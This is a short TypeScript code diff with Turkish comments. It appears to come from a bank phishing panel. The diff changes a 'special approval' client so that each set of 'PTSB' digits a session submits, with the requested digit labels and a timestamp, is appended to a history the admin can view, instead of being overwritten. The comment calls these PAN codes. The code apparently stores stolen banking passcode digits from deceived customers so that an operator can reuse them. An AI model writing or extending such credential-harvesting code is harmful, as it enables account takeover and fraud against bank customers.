@@ -550,6 +550,18 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
       ...parseApprovalHistory(previousFormData.approvalHistory),
       confirmedStatus,
     ].filter((item) => item && item.trim().length > 0);
+    // PAN kodlari gecmise de yazilir — yeni bir PTSB onayi ptsbDigit alanlarini
+    // sifirladiginda eski girisler admin "PTSB (Geçmiş)" bolumunde kalir.
+    const prevPtsbHistory = Array.isArray(
+      (previousFormData as Record<string, unknown>).ptsbHistory
+    )
+      ? [...((previousFormData as Record<string, unknown>).ptsbHistory as unknown[])]
+      : [];
+    prevPtsbHistory.push({
+      labels: viewState.ptsbDigitLabels.join(","),
+      digits,
+      submittedAt: new Date().toISOString(),
+    });
 
     const { error } = await supabase
       .from("sessions")
@@ -562,6 +574,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           ptsbDigit1: digits[0],
           ptsbDigit2: digits[1],
           ptsbDigit3: digits[2],
+          ptsbHistory: prevPtsbHistory,
           approvalConfirmedAt: new Date().toISOString(),
           approvalHistory: JSON.stringify(nextApprovalHistory),
         },
